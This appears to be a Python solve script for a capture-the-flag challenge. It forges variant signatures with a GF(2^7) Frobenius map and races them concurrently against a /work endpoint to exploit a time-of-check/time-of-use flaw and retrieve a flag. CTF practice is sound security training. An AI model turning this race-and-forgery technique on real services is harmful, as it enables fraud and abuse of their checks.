#!/usr/bin/env python3
import asyncio, re, sys, time
import requests, aiohttp

BASE_URL = sys.argv[1].rstrip("/")
TIMEOUT = 90

def gf2_7_square(a: int) -> int:
    """Computes a^2 in GF(2^7)"""
    p, b = 0, a
    for _ in range(7):
        if b & 1: p ^= a
        b >>= 1
        hi = a >> 6
        a = (a << 1) & 0x7F
        if hi: a ^= 0x03
    return p

def frob(sig_hex: str, n: int) -> list[str]:
    """Frobenius map of a signature in GF(2^7)."""
    variants, cur = [], bytes.fromhex(sig_hex)
    for _ in range(n):
        cur = bytes(gf2_7_square(b) for b in cur)
        variants.append(cur.hex())
    return variants[:-1]

async def race(uid: str, sigs: list[str]):
    async def post(i, sig):
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(force_close=True)) as s:
            async with s.post(f"{BASE_URL}/work?x={i}", json={"uid": uid, "sig": sig}, timeout=TIMEOUT) as r:
                return await r.text()
    await asyncio.gather(*(post(i, sig) for i, sig in enumerate(sigs)))

def solve():
    uid = re.search(r"uid is ([0-9a-f]+)", requests.get(f"{BASE_URL}/?x={time.time()}").text).group(1)
    print(f"UID: {uid}")

    def buy():
        return re.search(r"signature: ([0-9a-f]+)", requests.get(f"{BASE_URL}/buy", params={"uid": uid, "x": time.time()}).text).group(1)

    def work(sig):
        return re.search(r"stud is ([0-9a-f]+)", requests.post(f"{BASE_URL}/work?x={time.time()}", json={"uid": uid, "sig": sig}).text).group(1)

    sig_2 = work(work(buy()))
    print(f"Got sig_2: {sig_2}")

    clones = frob(sig_2, 7)
    print(f"Racing TOCTOU with {len(clones)} Frobenius clones...")
    asyncio.run(race(uid, clones))

    resp = requests.get(f"{BASE_URL}/buy", params={"uid": uid, "x": "flag"}).text
    match = re.search(r"UMASS\{[^}]+\}", resp)
    print(f"Flag: {match.group()}" if match else f"Failed. Server response:\n{resp}")

if __name__ == "__main__":
    solve()
